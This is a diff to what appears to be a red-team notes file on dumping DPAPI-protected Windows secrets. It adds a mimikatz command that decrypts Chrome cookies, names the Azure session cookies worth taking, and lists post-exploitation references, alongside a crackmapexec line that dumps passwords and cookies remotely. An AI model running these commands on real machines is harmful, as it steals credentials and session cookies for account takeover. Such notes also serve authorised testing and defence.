@@ -48,6 +48,13 @@ Dump DPAPI-protected secrets remotely and decrypt them with the domain backup ke
     crackmapexec smb ws01.corp.local --local-auth -u administrator -p passw0rd --dpapi passwords && crackmapexec smb ws01.corp.local --local-auth -u administrator -p passw0rd --dpapi cookies
     ~~~
 
+Dump Chrome cookies with [[notes/tools/mimikatz]].
+Cookies for Azure are `ESTSAUTH`, `ESTSAUTHPERSISTENT` and `ESTSAUTHLIGHT`.
+
+~~~ bat
+mimikatz.exe "dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect" exit
+~~~
+
 Untested tools:
 
 - [hekatomb](https://github.com/processus-thief/hekatomb), dumps domain backup keys, downloads credential files from all domain computers, decrypts the files
@@ -78,6 +85,7 @@ Untested tools:
 
 References:
 
+- [Sliver and Cursed Chrome for Post Exploitation](http://web.archive.org/web/20231013174228/https://dev.to/living_syn/sliver-and-cursed-chrome-for-post-exploitation-4gnk)
 - [Debugging Cookie Dumping Failures with Chromiums Remote Debugger](http://web.archive.org/web/20230721071951/https://scribe.rip/@slyd0g/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
 - [twitter.com/an0n_r0/status/1670007830072500225](https://twitter.com/an0n_r0/status/1670007830072500225)
 - [Headless Remote Chrome Debugging](https://gist.github.com/NotMedic/b1ab7809eea94cc05513905b26964663)
